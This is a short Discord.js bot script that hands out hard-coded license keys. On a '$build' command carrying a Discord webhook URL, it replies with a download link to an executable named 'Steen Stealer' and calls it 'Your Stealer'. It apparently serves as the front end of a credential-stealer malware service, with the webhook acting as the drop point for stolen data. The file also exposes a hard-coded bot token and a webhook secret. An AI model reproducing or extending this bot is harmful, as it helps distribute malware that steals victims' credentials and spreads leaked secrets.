const Discord = require("discord.js")
const client = new Discord.Client()



client.on('message', msg => {
  if(msg.content === '$createkey')
      msg.reply("5C3XWX4W")

})

client.on('message', msg => {
  if(msg.content === '$build https://discord.com/api/webhooks/939488575689474070/oe8eermUJz8b1CRyd7jNVYa2qFXkULmtoMjVsl46xjXRiE7sIPn9PeUKaEhazruwhHcp 5C3W6WSX')
      msg.reply("https://www.mediafire.com/file/xdwn5svvf0zryz9/Steen+Stealer+5s66WC9w3Z6w2C.exe/file Your Stealer Thanks For Using!")

})



client.on('message', msg => {
  if(msg.content === '$createkey')
      msg.reply("5C3W6WSX")

})

client.on('message', msg => {
  if(msg.content === '$mykey')
      msg.reply("5C3W6WSX")

})



client.on('message', msg => {
  if(msg.content === '$createkey')
      msg.reply("FTUXZ4Y8U")

})

client.on('message', msg => {
  if(msg.content === '$createkey')
      msg.reply("FT13QQSKO")

})

client.on('message', msg => {
  if(msg.content === '$key')
      msg.reply("Soon!")

})

client.on('message', msg => {
  if(msg.content === '$role')
      msg.reply("Soon!")

})

client.on('message', msg => {
  if(msg.content === '$build')
      msg.reply("Soon!")

})




client.login("OTM5MTQyNzg0MTg5ODg2NDY1.Yf0i4A.IyPBzpU66Bat9MeqCP6OWnt474w")
